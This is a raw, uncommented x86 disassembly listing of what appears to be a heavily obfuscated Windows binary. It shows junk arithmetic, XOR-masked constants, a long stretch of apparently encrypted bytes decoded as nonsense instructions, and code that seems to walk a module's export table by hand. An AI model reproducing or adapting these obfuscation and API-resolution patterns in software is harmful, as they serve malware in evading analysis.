  420ebb:	xor    esi,DWORD PTR ds:0x42820f
  420ec1:	adc    DWORD PTR ds:0x428267,edx
  420ec7:	xor    DWORD PTR ds:0x4282ef,edx
  420ecd:	mov    esi,DWORD PTR ds:0x42821b
  420ed3:	or     esi,DWORD PTR ds:0x428177
  420ed9:	mov    DWORD PTR ds:0x42821b,esi
  420edf:	and    ecx,ecx
  420ee1:	neg    DWORD PTR ds:0x42824f
  420ee7:	dec    ecx
  420ee8:	movzx  eax,WORD PTR ds:0x428137
  420eef:	sbb    eax,DWORD PTR ds:0x4282eb
  420ef5:	mov    ds:0x428137,eax
  420efa:	mov    eax,DWORD PTR [ebp-0x90]
  420f00:	xor    esi,esi
  420f02:	add    esi,DWORD PTR ds:0x4281e7
  420f08:	xor    ecx,ecx
  420f0a:	add    ecx,DWORD PTR ds:0x42833f
  420f10:	sub    ecx,esi
  420f12:	xor    esi,DWORD PTR [esi+ecx*1]
  420f15:	lea    eax,[eax+edx*1+0x14f2e240]
  420f1c:	cmp    DWORD PTR ds:0x4282ef,0x0
  420f23:	mov    DWORD PTR ds:0x428283,0x1362
  420f2d:	mov    DWORD PTR ds:0x428233,edx
  420f33:	mov    DWORD PTR ds:0x42826f,edi
  420f39:	jmp    0x421029
  420f3e:	mov    DWORD PTR ds:0x428353,0xeb5
  420f48:	cmp    DWORD PTR ds:0x4282ef,0x0
  420f4f:	ja     0x420f81
  420f55:	push   DWORD PTR [ebp-0x24]
  420f58:	push   DWORD PTR [ebp-0x14]
  420f5b:	push   DWORD PTR [ebp-0x14]
  420f5e:	call   DWORD PTR ds:0x428eb0
  420f64:	neg    ecx
  420f66:	xor    esi,esi
  420f68:	or     esi,DWORD PTR ds:0x4281bf
  420f6e:	xor    edx,edx
  420f70:	add    edx,DWORD PTR ds:0x4281cb
  420f76:	sub    edx,esi
  420f78:	or     esi,DWORD PTR [esi+edx*1]
  420f7b:	sub    DWORD PTR ds:0x428247,ecx
  420f81:	mov    edx,DWORD PTR ds:0x42823f
  420f87:	sbb    edx,DWORD PTR ds:0x428387
  420f8d:	mov    DWORD PTR ds:0x42823f,edx
  420f93:	add    DWORD PTR ds:0x42817b,ecx
  420f99:	sub    DWORD PTR ds:0x42836b,0x4282db
  420fa3:	cmp    DWORD PTR ds:0x428267,0x0
  420faa:	mov    ecx,DWORD PTR ds:0x42834b
  420fb0:	movzx  edx,BYTE PTR ds:0x428153
  420fb7:	mov    DWORD PTR ds:0x4282d7,0x5580
  420fc1:	mov    DWORD PTR ds:0x428383,edi
  420fc7:	jmp    0x421029
  420fcc:	mov    DWORD PTR ds:0x428387,0x673a
  420fd6:	cmp    DWORD PTR ds:0x428267,0x0
  420fdd:	jle    0x420ffa
  420fe3:	push   DWORD PTR [ebp-0x20]
  420fe6:	call   DWORD PTR ds:0x428d54
  420fec:	xor    esi,edx
  420fee:	add    ecx,0x6ba8
  420ff4:	xor    edx,0x4b1f
  420ffa:	mov    edx,DWORD PTR ds:0x4282e7
  421000:	sbb    DWORD PTR ds:0x428263,edx
  421006:	movzx  edx,WORD PTR ds:0x42813b
  42100d:	or     edx,DWORD PTR ds:0x428363
  421013:	mov    DWORD PTR ds:0x42813b,edx
  421019:	dec    DWORD PTR ds:0x428353
  42101f:	sub    DWORD PTR ds:0x42825f,0x689b
  421029:	mov    DWORD PTR [ebp-0x174],eax
  42102f:	mov    eax,DWORD PTR [ebp-0x24]
  421032:	mov    ecx,DWORD PTR [ebp-0x94]
  421038:	add    esi,edx
  42103a:	mov    edx,DWORD PTR [ebp-0x10]
  42103d:	neg    esi
  42103f:	xor    edx,ecx
  421041:	cmp    DWORD PTR ds:0x42814b,0x0
  421048:	mov    DWORD PTR ds:0x428357,0x62d9
  421052:	mov    DWORD PTR ds:0x428137,0x300d
  42105c:	mov    DWORD PTR ds:0x42813b,0x20bd
  421066:	mov    ecx,DWORD PTR ds:0x4282df
  42106c:	jmp    0x4210b5
  421071:	mov    DWORD PTR ds:0x42834f,0x134d
  42107b:	cmp    DWORD PTR ds:0x42814b,0x0
  421082:	jae    0x4210a9
  421088:	push   DWORD PTR [ebp-0xc]
  42108b:	push   0x4ac4
  421090:	push   DWORD PTR [ebp-0x24]
  421093:	push   0x863f
  421098:	push   DWORD PTR [ebp-0x28]
  42109b:	call   DWORD PTR ds:0x428d74
  4210a1:	sbb    ecx,DWORD PTR ds:0x428263
  4210a7:	adc    esi,esi
  4210a9:	and    DWORD PTR ds:0x428287,edi
  4210af:	sbb    ecx,DWORD PTR ds:0x428143
  4210b5:	add    edx,DWORD PTR [ebp-0x78]
  4210b8:	mov    ecx,DWORD PTR [ebp-0xc0]
  4210be:	lea    ecx,[edx+ecx*1+0x6ac1]
  4210c5:	and    ecx,eax
  4210c7:	mov    eax,0x1101
  4210cc:	sub    eax,ecx
  4210ce:	add    eax,DWORD PTR [ebp+0x8]
  4210d1:	mov    DWORD PTR [ebp-0x170],eax
  4210d7:	mov    DWORD PTR [ebp-0x15c],0xca79a575
  4210e1:	mov    DWORD PTR [ebp-0x158],0x9c1b89e8
  4210eb:	mov    DWORD PTR [ebp-0x154],0xca79a571
  4210f5:	mov    DWORD PTR [ebp-0x150],0x9c1b89e8
  4210ff:	mov    esi,DWORD PTR [ebp-0x174]
  421105:	mov    eax,DWORD PTR [ebp-0x154]
  42110b:	mov    edx,DWORD PTR [ebp-0x150]
  421111:	xor    eax,0xca79a575
  421116:	xor    edx,0x9c1b89e8
  42111c:	mov    cl,0x2
  42111e:	call   0x40a9b5
  421123:	mov    edi,eax
  421125:	mov    ebx,edx
  421127:	mov    eax,DWORD PTR [ebp-0x154]
  42112d:	mov    edx,DWORD PTR [ebp-0x150]
  421133:	xor    eax,0xca79a575
  421138:	xor    edx,0x9c1b89e8
  42113e:	mov    cl,0x3e
  421140:	call   0x422211
  421145:	or     edi,eax
  421147:	or     ebx,edx
  421149:	jmp    0x421354
  42114e:	test   al,0x92
  421150:	fdivr  st,st(3)
  421152:	and    bh,BYTE PTR [edx]
  421154:	call   0x5bbc:0x65828d2a
  42115b:	xchg   ecx,eax
  42115c:	mov    ecx,0x160fc17c
  421161:	sbb    BYTE PTR [esi+edx*1+0x18],al
  421165:	sbb    BYTE PTR [esi-0x5],dh
  421168:	mov    ah,al
  42116a:	push   esp
  42116b:	mov    eax,0xe313b717
  421170:	scas   al,BYTE PTR es:[edi]
  421171:	xor    eax,0x6e51399a
  421176:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421177:	outs   dx,BYTE PTR fs:[esi]
  421179:	call   FWORD PTR [ecx-0x24]
  42117c:	mov    eax,0x34b407c8
  421181:	pop    es
  421182:	test   BYTE PTR [eax],cl
  421184:	xchg   DWORD PTR [eax+0x7b3f149f],ebp
  42118a:	scas   al,BYTE PTR es:[edi]
  42118b:	push   ebp
  42118c:	sub    BYTE PTR [esi-0xf],ch
  42118f:	popf   
  421190:	ins    BYTE PTR es:[edi],dx
  421191:	fnstenv [ecx+0x48e66fc8]
  421197:	retf   0xc15c
  42119a:	in     al,dx
  42119b:	(bad)  
  42119c:	loop   0x4211ad
  42119e:	stos   DWORD PTR es:[edi],eax
  42119f:	cld    
  4211a0:	cdq    
  4211a1:	pop    esp
  4211a2:	or     eax,0x67ac0405
  4211a7:	mov    eax,ds:0xf070a588
  4211ac:	popa   
  4211ad:	mov    cs,WORD PTR ss:[ebx*8+0x525a7083]
  4211b5:	addr16 hlt 
  4211b7:	jbe    0x421169
  4211b9:	rcr    BYTE PTR [edx+0x2b56e8bd],0xde
  4211c0:	(bad)
  4211c3:	xchg   esi,eax
  4211c4:	js     0x4211a5
  4211c6:	test   al,0x1c
  4211c8:	jbe    0x42120e
  4211ca:	imul   edi,DWORD PTR [ebx],0xffffff9c
  4211cd:	stos   DWORD PTR es:[edi],eax
  4211ce:	faddp  st(1),st
  4211d0:	in     al,dx
  4211d1:	in     eax,dx
  4211d2:	or     DWORD PTR [esi],ebx
  4211d4:	ret    
  4211d5:	js     0x4211eb
  4211d7:	outs   dx,BYTE PTR ds:[esi]
  4211d8:	in     eax,0x42
  4211da:	je     0x4211c4
  4211dc:	add    al,0xb1
  4211de:	push   ebx
  4211df:	add    BYTE PTR [ebx-0x80],al
  4211e2:	mov    eax,0x254a13f
  4211e7:	or     al,0x89
  4211e9:	push   cs
  4211ea:	xor    DWORD PTR ds:0x390901f4,ebx
  4211f0:	fdiv   DWORD PTR [esi-0x19]
  4211f3:	jbe    0x42120d
  4211f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4211f6:	push   ss
  4211f7:	push   ds
  4211f8:	and    BYTE PTR [edx-0x4af2b575],dl
  4211fe:	xor    ebx,DWORD PTR [eax+0x1e]
  421201:	cmp    eax,0x9b32b110
  421206:	and    eax,0xae5494cf
  42120b:	in     al,dx
  42120c:	pop    ss
  42120d:	std    
  42120e:	sbb    DWORD PTR cs:[esi],edx
  421211:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421212:	sar    esp,1
  421214:	pusha  
  421215:	add    cl,bh
  421217:	pop    es
  421218:	in     eax,0xc2
  42121a:	xchg   esp,eax
  42121b:	ror    DWORD PTR [ebx],1
  42121d:	adc    eax,0xda46c2d6
  421222:	dec    ebp
  421223:	push   cs
  421224:	sbb    BYTE PTR [edx],al
  421226:	inc    edi
  421227:	mov    al,0xa6
  421229:	or     al,0xe9
  42122b:	and    BYTE PTR [edx],0xea
  42122e:	fstp   TBYTE PTR fs:[ecx-0x74]
  421232:	mov    ebx,0xc0f11e18
  421237:	fmul   DWORD PTR [ebp-0x400b2475]
  42123d:	mov    esp,0xa912b333
  421242:	sbb    ch,dl
  421244:	cmp    BYTE PTR [esi],cl
  421246:	fwait
  421247:	mov    ds:0xbecd204b,al
  42124c:	pop    ecx
  42124d:	xchg   BYTE PTR [ebx+0x13],dl
  421250:	fistp  QWORD PTR [ebp+0x28]
  421253:	gs loope 0x42125e
  421256:	push   es
  421257:	sti    
  421258:	add    edi,DWORD PTR es:[ecx+0x434d078f]
  42125f:	cmp    bl,dl
  421261:	hlt    
  421262:	dec    esi
  421263:	and    BYTE PTR [edx-0x4],0xc3
  421267:	js     0x421213
  421269:	mov    dl,0xf1
  42126b:	rol    BYTE PTR [edi],cl
  42126d:	pop    esi
  42126e:	and    BYTE PTR [edi],bl
  421270:	mov    edx,0x8a1bc72d
  421275:	xor    ch,BYTE PTR [ebx+edx*8+0x1f]
  421279:	in     eax,dx
  42127a:	cs jns 0x4212d9
  42127d:	push   cs
  42127e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42127f:	arpl   WORD PTR [edi-0x55],ax
  421282:	add    edi,0xffffff9d
  421285:	pushf  
  421286:	shl    BYTE PTR [edi-0x1c],cl
  421289:	adc    al,0x84
  42128b:	inc    esi
  42128c:	(bad)  
  42128d:	jno    0x42123d
  42128f:	fdivr  QWORD PTR [eax-0x7a60503d]
  421295:	jno    0x4212ed
  421297:	inc    edx
  421298:	hlt    
  421299:	pop    esp
  42129a:	rcl    BYTE PTR [ebx+0x43a23d4f],0x7a
  4212a1:	jne    0x4212dd
  4212a3:	jl     0x42126d
  4212a5:	arpl   WORD PTR [eax],cx
  4212a7:	dec    ebp
  4212a8:	xchg   edx,eax
  4212a9:	mov    edi,0xd7a8398f
  4212ae:	test   bl,bh
  4212b0:	push   edx
  4212b1:	gs mov cl,0x42
  4212b4:	sbb    edi,ebp
  4212b6:	out    dx,eax
  4212b7:	bswap  esp
  4212b9:	adc    ch,dh
  4212bb:	fs mov bh,0x68
  4212be:	dec    ecx
  4212bf:	sub    ebp,DWORD PTR [ebx+0x4e]
  4212c2:	dec    eax
  4212c3:	sahf   
  4212c4:	push   ss
  4212c5:	mov    esi,0x6db691d1
  4212ca:	pop    esi
  4212cb:	sahf   
  4212cc:	inc    esp
  4212cd:	outs   dx,BYTE PTR ds:[esi]
  4212ce:	std    
  4212cf:	cmp    bl,BYTE PTR [eax+0x504ce457]
  4212d5:	dec    edx
  4212d6:	and    BYTE PTR [edx+0x21],ah
  4212d9:	sub    cl,BYTE PTR [edi+eax*2]
  4212dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4212dd:	push   esp
  4212de:	pop    edi
  4212df:	xchg   edi,eax
  4212e0:	std    
  4212e1:	cld    
  4212e2:	ss retf 0xd96f
  4212e6:	test   al,0x34
  4212e8:	out    dx,eax
  4212e9:	push   es
  4212ea:	mov    edi,fs
  4212ec:	(bad)  
  4212ed:	repz jo 0x42130e
  4212f0:	lahf   
  4212f1:	dec    ecx
  4212f2:	sahf   
  4212f3:	retf   
  4212f4:	cdq    
  4212f5:	add    BYTE PTR [ebx-0x42],ch
  4212f8:	cmc    
  4212f9:	js     0x421319
  4212fb:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4212fd:	out    0x24,eax
  4212ff:	sub    bl,BYTE PTR [ebp+0x22717c46]
  421305:	fstp   TBYTE PTR [edi]
  421307:	jne    0x421370
  421309:	jbe    0x421328
  42130b:	xchg   edx,eax
  42130c:	xor    al,0xed
  42130e:	retf   0x4a16
  421311:	sbb    ecx,DWORD PTR [eax-0x59cb3d6c]
  421317:	add    DWORD PTR [esi+0x13ac95e2],eax
  42131d:	xlat   BYTE PTR ds:[ebx]
  42131e:	call   0xbee02c9f
  421323:	jl     0x421310
  421325:	repnz push cs
  421327:	dec    ebp
  421328:	(bad)  
  421329:	lea    ebx,[eax]
  42132b:	xchg   ecx,eax
  42132c:	sar    BYTE PTR [eax+0x18b26fe2],0xfd
  421333:	lock cli 
  421335:	sub    al,0xe8
  421337:	rcr    bh,0xef
  42133a:	xor    edi,DWORD PTR [edi]
  42133c:	dec    ebp
  42133d:	sbb    eax,0xe410ff67
  421342:	mov    ah,0xac
  421344:	jmp    0x4212f6
  421346:	jecxz  0x4213af
  421348:	clc    
  421349:	mov    ch,0x94
  42134b:	jo     0x42132d
  42134d:	or     BYTE PTR [edi],ah
  42134f:	aad    0x8a
  421351:	aaa    
  421352:	mov    cl,0x18
  421354:	mov    eax,DWORD PTR [ebp-0x15c]
  42135a:	mov    edx,DWORD PTR [ebp-0x158]
  421360:	xor    eax,0xca79a575
  421365:	xor    edx,0x9c1b89e8
  42136b:	mov    cl,0x2
  42136d:	call   0x40a9b5
  421372:	mov    ecx,edx
  421374:	mov    edx,DWORD PTR [ebp-0x15c]
  42137a:	mov    DWORD PTR [ebp-0x218],esi
  421380:	mov    esi,DWORD PTR [ebp-0x158]
  421386:	xor    edx,0xca79a575
  42138c:	xor    esi,0x9c1b89e8
  421392:	mov    DWORD PTR [ebp-0x21c],eax
  421398:	mov    eax,edx
  42139a:	mov    edx,esi
  42139c:	mov    DWORD PTR [ebp-0x220],ecx
  4213a2:	mov    cl,0x3e
  4213a4:	call   0x422211
  4213a9:	mov    esi,DWORD PTR [ebp-0x21c]
  4213af:	or     esi,eax
  4213b1:	mov    eax,DWORD PTR [ebp-0x220]
  4213b7:	or     eax,edx
  4213b9:	push   eax
  4213ba:	push   esi
  4213bb:	push   ebx
  4213bc:	push   edi
  4213bd:	call   0x416c20
  4213c2:	mov    esi,DWORD PTR [ebp-0x218]
  4213c8:	cmp    esi,eax
  4213ca:	jne    0x421480
  4213d0:	mov    eax,DWORD PTR [ebp-0x154]
  4213d6:	mov    edx,DWORD PTR [ebp-0x150]
  4213dc:	xor    eax,0xca79a575
  4213e1:	xor    edx,0x9c1b89e8
  4213e7:	mov    cl,0x2
  4213e9:	call   0x40a9b5
  4213ee:	mov    esi,eax
  4213f0:	mov    edi,edx
  4213f2:	mov    eax,DWORD PTR [ebp-0x154]
  4213f8:	mov    edx,DWORD PTR [ebp-0x150]
  4213fe:	xor    eax,0xca79a575
  421403:	xor    edx,0x9c1b89e8
  421409:	mov    cl,0x3e
  42140b:	call   0x422211
  421410:	or     esi,eax
  421412:	or     edi,edx
  421414:	mov    eax,DWORD PTR [ebp-0x15c]
  42141a:	mov    edx,DWORD PTR [ebp-0x158]
  421420:	xor    eax,0xca79a575
  421425:	xor    edx,0x9c1b89e8
  42142b:	mov    cl,0x2
  42142d:	call   0x40a9b5
  421432:	mov    ebx,eax
  421434:	mov    eax,edx
  421436:	mov    ecx,DWORD PTR [ebp-0x15c]
  42143c:	mov    edx,DWORD PTR [ebp-0x158]
  421442:	xor    ecx,0xca79a575
  421448:	xor    edx,0x9c1b89e8
  42144e:	mov    DWORD PTR [ebp-0x224],eax
  421454:	mov    eax,ecx
  421456:	mov    cl,0x3e
  421458:	call   0x422211
  42145d:	or     ebx,eax
  42145f:	mov    eax,DWORD PTR [ebp-0x224]
  421465:	or     eax,edx
  421467:	push   eax
  421468:	push   ebx
  421469:	push   edi
  42146a:	push   esi
  42146b:	call   0x416c20
  421470:	mov    DWORD PTR [ebp-0x178],eax
  421476:	jmp    0x421740
  42147b:	jmp    0x4216f6
  421480:	lea    eax,[ebp-0x168]
  421486:	mov    DWORD PTR [ebp-0x164],eax
  42148c:	mov    eax,DWORD PTR [ebp-0x164]
  421492:	mov    DWORD PTR [eax],0xa4069aae
  421498:	mov    eax,DWORD PTR [ebp-0x168]
  42149e:	xor    eax,0xa4069aae
  4214a3:	shr    eax,0x2
  4214a6:	mov    ecx,DWORD PTR [ebp-0x168]
  4214ac:	xor    ecx,0xa4069aae
  4214b2:	shl    ecx,0x1e
  4214b5:	or     eax,ecx
  4214b7:	mov    ecx,DWORD PTR [ebp-0x174]
  4214bd:	mov    eax,DWORD PTR [ecx+eax*8+0x78]
  4214c1:	mov    DWORD PTR [ebp-0x160],eax
  4214c7:	mov    esi,DWORD PTR [ebp-0x160]
  4214cd:	mov    eax,DWORD PTR [ebp-0x154]
  4214d3:	mov    edx,DWORD PTR [ebp-0x150]
  4214d9:	xor    eax,0xca79a575
  4214de:	xor    edx,0x9c1b89e8
  4214e4:	mov    cl,0x2
  4214e6:	call   0x40a9b5
  4214eb:	mov    edi,eax
  4214ed:	mov    ebx,edx
  4214ef:	mov    eax,DWORD PTR [ebp-0x154]
  4214f5:	mov    edx,DWORD PTR [ebp-0x150]
  4214fb:	xor    eax,0xca79a575
  421500:	xor    edx,0x9c1b89e8
  421506:	mov    cl,0x3e
  421508:	call   0x422211
  42150d:	or     edi,eax
  42150f:	or     ebx,edx
  421511:	mov    eax,DWORD PTR [ebp-0x15c]
  421517:	mov    edx,DWORD PTR [ebp-0x158]
  42151d:	xor    eax,0xca79a575
  421522:	xor    edx,0x9c1b89e8
  421528:	mov    cl,0x2
  42152a:	call   0x40a9b5
  42152f:	mov    ecx,edx
  421531:	mov    edx,DWORD PTR [ebp-0x15c]
  421537:	mov    DWORD PTR [ebp-0x228],esi
  42153d:	mov    esi,DWORD PTR [ebp-0x158]
  421543:	xor    edx,0xca79a575
  421549:	xor    esi,0x9c1b89e8
  42154f:	mov    DWORD PTR [ebp-0x22c],eax
  421555:	mov    eax,edx
  421557:	mov    edx,esi
  421559:	mov    DWORD PTR [ebp-0x230],ecx
  42155f:	mov    cl,0x3e
  421561:	call   0x422211
  421566:	mov    esi,DWORD PTR [ebp-0x22c]
  42156c:	or     esi,eax
  42156e:	mov    eax,DWORD PTR [ebp-0x230]
  421574:	or     eax,edx
  421576:	push   eax
  421577:	push   esi
  421578:	push   ebx
  421579:	push   edi
  42157a:	call   0x416c20
  42157f:	mov    esi,DWORD PTR [ebp-0x228]
  421585:	cmp    esi,eax
  421587:	je     0x4215fc
  42158d:	mov    eax,DWORD PTR [ebp-0x154]
  421593:	mov    edx,DWORD PTR [ebp-0x150]
  421599:	xor    eax,0xca79a575
  42159e:	xor    edx,0x9c1b89e8
  4215a4:	mov    cl,0x2
  4215a6:	call   0x40a9b5
  4215ab:	mov    esi,eax
  4215ad:	mov    edi,edx
  4215af:	mov    eax,DWORD PTR [ebp-0x154]
  4215b5:	mov    edx,DWORD PTR [ebp-0x150]
  4215bb:	xor    eax,0xca79a575
  4215c0:	xor    edx,0x9c1b89e8
  4215c6:	mov    cl,0x3e
  4215c8:	call   0x422211
  4215cd:	or     esi,eax
  4215cf:	or     edi,edx
  4215d1:	mov    eax,DWORD PTR [ebp-0x160]
  4215d7:	imul   esi,eax
  4215da:	add    esi,DWORD PTR [ebp-0x170]
  4215e0:	mov    DWORD PTR [ebp-0x16c],esi
  4215e6:	mov    eax,DWORD PTR [ebp-0x16c]
  4215ec:	mov    DWORD PTR [ebp-0x178],eax
  4215f2:	jmp    0x421740
  4215f7:	jmp    0x4216a7
  4215fc:	mov    eax,DWORD PTR [ebp-0x154]
  421602:	mov    edx,DWORD PTR [ebp-0x150]
  421608:	xor    eax,0xca79a575
  42160d:	xor    edx,0x9c1b89e8
  421613:	mov    cl,0x2
  421615:	call   0x40a9b5
  42161a:	mov    esi,eax
  42161c:	mov    edi,edx
  42161e:	mov    eax,DWORD PTR [ebp-0x154]
  421624:	mov    edx,DWORD PTR [ebp-0x150]
  42162a:	xor    eax,0xca79a575
  42162f:	xor    edx,0x9c1b89e8
  421635:	mov    cl,0x3e
  421637:	call   0x422211
  42163c:	or     esi,eax
  42163e:	or     edi,edx
  421640:	mov    eax,DWORD PTR [ebp-0x15c]
  421646:	mov    edx,DWORD PTR [ebp-0x158]
  42164c:	xor    eax,0xca79a575
  421651:	xor    edx,0x9c1b89e8
  421657:	mov    cl,0x2
  421659:	call   0x40a9b5
  42165e:	mov    ebx,eax
  421660:	mov    eax,edx
  421662:	mov    ecx,DWORD PTR [ebp-0x15c]
  421668:	mov    edx,DWORD PTR [ebp-0x158]
  42166e:	xor    ecx,0xca79a575
  421674:	xor    edx,0x9c1b89e8
  42167a:	mov    DWORD PTR [ebp-0x234],eax
  421680:	mov    eax,ecx
  421682:	mov    cl,0x3e
  421684:	call   0x422211
  421689:	or     ebx,eax
  42168b:	mov    eax,DWORD PTR [ebp-0x234]
  421691:	or     eax,edx
  421693:	push   eax
  421694:	push   ebx
  421695:	push   edi
  421696:	push   esi
  421697:	call   0x416c20
  42169c:	mov    DWORD PTR [ebp-0x178],eax
  4216a2:	jmp    0x421740
  4216a7:	mov    eax,DWORD PTR [ebp-0x15c]
  4216ad:	mov    edx,DWORD PTR [ebp-0x158]
  4216b3:	xor    eax,0xca79a575
  4216b8:	xor    edx,0x9c1b89e8
  4216be:	mov    cl,0x2
  4216c0:	call   0x40a9b5
  4216c5:	mov    esi,eax
  4216c7:	mov    edi,edx
  4216c9:	mov    eax,DWORD PTR [ebp-0x15c]
  4216cf:	mov    edx,DWORD PTR [ebp-0x158]
  4216d5:	xor    eax,0xca79a575
  4216da:	xor    edx,0x9c1b89e8
  4216e0:	mov    cl,0x3e
  4216e2:	call   0x422211
  4216e7:	or     esi,eax
  4216e9:	or     edi,edx
  4216eb:	mov    DWORD PTR [ebp-0x178],esi
  4216f1:	jmp    0x421740
  4216f6:	mov    eax,DWORD PTR [ebp-0x15c]
  4216fc:	mov    edx,DWORD PTR [ebp-0x158]
  421702:	xor    eax,0xca79a575
  421707:	xor    edx,0x9c1b89e8
  42170d:	mov    cl,0x2
  42170f:	call   0x40a9b5
  421714:	mov    esi,eax
  421716:	mov    edi,edx
  421718:	mov    eax,DWORD PTR [ebp-0x15c]
  42171e:	mov    edx,DWORD PTR [ebp-0x158]
  421724:	xor    eax,0xca79a575
  421729:	xor    edx,0x9c1b89e8
  42172f:	mov    cl,0x3e
  421731:	call   0x422211
  421736:	or     esi,eax
  421738:	or     edi,edx
  42173a:	mov    DWORD PTR [ebp-0x178],esi
  421740:	mov    ecx,DWORD PTR [ebp-0xd8]
  421746:	mov    eax,0x459a
  42174b:	xor    edx,edx
  42174d:	div    ecx
  42174f:	mov    ecx,DWORD PTR [ebp-0xdc]
  421755:	and    eax,ecx
  421757:	add    eax,DWORD PTR [ebp-0x44]
  42175a:	mov    ecx,DWORD PTR [ebp-0xe0]
  421760:	lea    eax,[eax+ecx*1+0x272f]
  421767:	xor    eax,0x1080c
  42176c:	add    eax,DWORD PTR [ebp-0x178]
  421772:	mov    DWORD PTR [ebp-0xe8],eax
  421778:	mov    DWORD PTR [ebp-0xc],0x5950
  42177f:	mov    DWORD PTR [ebp-0xf8],0x4964
  421789:	mov    DWORD PTR [ebp-0x130],0x3
  421793:	mov    DWORD PTR [ebp-0x20],0x2df9
  42179a:	mov    DWORD PTR [ebp-0x8],0x4524
  4217a1:	mov    DWORD PTR [ebp-0xd4],0x637e
  4217ab:	mov    DWORD PTR [ebp-0x110],0x38c8
  4217b5:	mov    DWORD PTR [ebp-0xa4],0x7118
  4217bf:	mov    DWORD PTR [ebp-0xa0],0xaf6
  4217c9:	mov    DWORD PTR [ebp-0x10c],0x3315
  4217d3:	mov    eax,DWORD PTR [ebp-0xf8]
  4217d9:	mov    ecx,DWORD PTR [ebp-0x130]
  4217df:	xor    edx,edx
  4217e1:	div    ecx
  4217e3:	add    eax,0x454e
  4217e8:	mov    ecx,DWORD PTR [ebp-0xc]
  4217eb:	and    eax,ecx
  4217ed:	xor    eax,0x5940
  4217f2:	add    eax,DWORD PTR [ebp+0x8]
  4217f5:	mov    ecx,DWORD PTR [ebp-0x110]
  4217fb:	mov    edx,DWORD PTR [ebp-0xa4]
  421801:	sub    ecx,edx
  421803:	mov    edx,DWORD PTR [ebp-0xd4]
  421809:	or     ecx,edx
  42180b:	mov    edx,DWORD PTR [ebp-0x8]
  42180e:	and    ecx,edx
  421810:	mov    edx,DWORD PTR [ebp-0x20]
  421813:	xor    ecx,edx
  421815:	mov    edx,DWORD PTR [ebp-0x10c]
  42181b:	mov    esi,0x180f
  421820:	sub    esi,edx
  421822:	mov    edx,DWORD PTR [ebp-0xa0]
  421828:	imul   esi,edx
  42182b:	xor    esi,0x402b
  421831:	xor    esi,0xfed78c17
  421837:	mov    edx,DWORD PTR [ebp-0xe8]
  42183d:	mov    ecx,DWORD PTR [edx+ecx*1-0x68bd]
  421844:	add    ecx,eax
  421846:	add    esi,ecx
  421848:	mov    DWORD PTR [ebp-0x38],esi
  42184b:	mov    DWORD PTR [ebp-0x4],0x59a8
  421852:	mov    DWORD PTR [ebp-0x30],0x7021
  421859:	mov    DWORD PTR [ebp-0xf4],0x6210
  421863:	mov    DWORD PTR [ebp-0x58],0x73d5
  42186a:	mov    DWORD PTR [ebp-0x124],0x1e7d
  421874:	mov    DWORD PTR [ebp-0x3c],0x3144
  42187b:	mov    eax,DWORD PTR [ebp-0x30]
  42187e:	xor    eax,0x75cb
  421883:	mov    ecx,DWORD PTR [ebp-0x4]
  421886:	imul   eax,ecx
  421889:	mov    ecx,DWORD PTR [ebp+0x8]
  42188c:	lea    ecx,[ecx+eax*1-0x2123b90]
  421893:	mov    eax,DWORD PTR [ebp-0xf4]
  421899:	and    eax,0x6b34
  42189e:	and    eax,0x658d
  4218a3:	xor    edx,edx
  4218a5:	push   0x6
  4218a7:	pop    esi
  4218a8:	div    esi
  4218aa:	imul   eax,eax,0x3fb9
  4218b0:	mov    edx,DWORD PTR [ebp-0x3c]
  4218b3:	and    edx,0x58c7
  4218b9:	mov    esi,DWORD PTR [ebp-0x124]
  4218bf:	or     edx,esi
  4218c1:	add    edx,0x7a25
  4218c7:	imul   edx,edx,0x28d2
  4218cd:	mov    esi,DWORD PTR [ebp-0x58]
  4218d0:	xor    edx,esi
  4218d2:	xor    edx,0x1856f731
  4218d8:	mov    esi,DWORD PTR [ebp-0xe8]
  4218de:	mov    eax,DWORD PTR [esi+eax*1-0x3fb8fdc]
  4218e5:	add    eax,ecx
  4218e7:	add    edx,eax
  4218e9:	mov    DWORD PTR [ebp-0xac],edx
  4218ef:	mov    DWORD PTR [ebp-0x54],0x1
  4218f6:	mov    DWORD PTR [ebp-0x40],0x1ee8
  4218fd:	mov    DWORD PTR [ebp-0x1c],0x64d8
  421904:	mov    DWORD PTR [ebp-0xf0],0x5a06
  42190e:	mov    DWORD PTR [ebp-0x108],0x2eeb
  421918:	mov    DWORD PTR [ebp-0x104],0x2108
  421922:	mov    eax,DWORD PTR [ebp-0x1c]
  421925:	xor    edx,edx
  421927:	push   0x3
  421929:	pop    ecx
  42192a:	div    ecx
  42192c:	mov    ecx,DWORD PTR [ebp-0x40]
  42192f:	or     eax,ecx
  421931:	mov    ecx,DWORD PTR [ebp-0x54]
  421934:	xor    edx,edx
  421936:	div    ecx
  421938:	imul   eax,eax,0x7d53
  42193e:	mov    ecx,DWORD PTR [ebp+0x8]
  421941:	lea    eax,[ecx+eax*1-0x1f534807]
  421948:	mov    ecx,DWORD PTR [ebp-0xf0]
  42194e:	and    ecx,0x4108
  421954:	and    ecx,0x40e7
  42195a:	sub    ecx,0x1a54
  421960:	xor    ecx,0x25ac
  421966:	mov    edx,DWORD PTR [ebp-0x104]
  42196c:	xor    edx,0x6dda
  421972:	mov    esi,DWORD PTR [ebp-0x108]
  421978:	and    edx,esi
  42197a:	and    edx,0xe0c
  421980:	or     edx,0x5b
  421983:	mov    esi,DWORD PTR [ebp-0xe8]
  421989:	mov    ecx,DWORD PTR [esi+ecx*1+0x1c]
  42198d:	add    ecx,eax
  42198f:	lea    eax,[edx+ecx*1-0xc5b]
  421996:	mov    DWORD PTR [ebp-0xa8],eax
  42199c:	and    DWORD PTR [ebp-0x144],0x0
  4219a3:	jmp    0x4219b5
  4219a8:	mov    eax,DWORD PTR [ebp-0x144]
  4219ae:	inc    eax
  4219af:	mov    DWORD PTR [ebp-0x144],eax
  4219b5:	mov    eax,DWORD PTR [ebp-0xe8]
  4219bb:	mov    ecx,DWORD PTR [ebp-0x144]
  4219c1:	cmp    ecx,DWORD PTR [eax+0x18]
  4219c4:	je     0x421f7d
  4219ca:	mov    eax,DWORD PTR [ebp-0x144]
  4219d0:	mov    ecx,DWORD PTR [ebp-0x38]
